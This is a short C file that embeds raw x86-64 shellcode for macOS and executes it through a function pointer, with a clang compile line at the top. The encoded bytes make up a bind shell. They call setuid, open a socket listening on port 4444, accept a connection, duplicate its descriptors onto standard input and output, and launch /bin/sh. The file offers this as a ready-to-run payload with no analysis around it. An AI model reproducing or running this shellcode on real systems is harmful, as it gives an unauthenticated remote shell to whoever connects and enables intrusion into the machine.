// compile with clang -Wall -Wextra -pedantic -O2 bindshell_test.c -o bindshell_test
#include <stdio.h>
#include <string.h>

 
__attribute__((section("__TEXT,__text")))
char code[] ="\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x4c\x89\xc0\x48\x31"
            "\xff\x48\x31\xf6\x0f\x05\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8"
            "\x61\x4c\x89\xc0\x40\xb7\x02\x40\xb6\x01\x48\x31\xd2\x0f\x05\x49"
            "\x89\xc4\x4d\x31\xc0\x41\x50\x66\x68\x11\x5c\x66\x6a\x02\x49\x89"
            "\xe5\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x68\x4c\x89\xc0\x4c"
            "\x89\xe7\x4c\x89\xee\xb2\x10\x0f\x05\x41\xb0\x02\x49\xc1\xe0\x18"
            "\x49\x83\xc8\x6a\x4c\x89\xc0\x4c\x89\xe7\x48\x31\xf6\x0f\x05\x41"
            "\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x1e\x4c\x89\xc0\x4c\x89\xe7"
            "\x48\x31\xf6\x48\x31\xd2\x0f\x05\x49\x89\xc4\x41\xb0\x02\x49\xc1"
            "\xe0\x18\x49\x83\xc8\x5a\x4c\x89\xc0\x4c\x89\xe7\x4c\x89\xfe\x0f"
            "\x05\x49\x83\xff\x02\x49\xff\xc7\x76\xe1\x41\xb0\x02\x49\xc1\xe0"
            "\x18\x49\x83\xc8\x3b\x4c\x89\xc0\x48\x31\xff\x57\x48\xbf\x2f\x62"
            "\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2"
            "\x0f\x05";

int main()
{
	  // function pointer
    int (*function)();

    // cast shellcode as a function
    function = (int(*)())code;

    // execute shellcode function
    (int)(*function)();
    return 0;

}



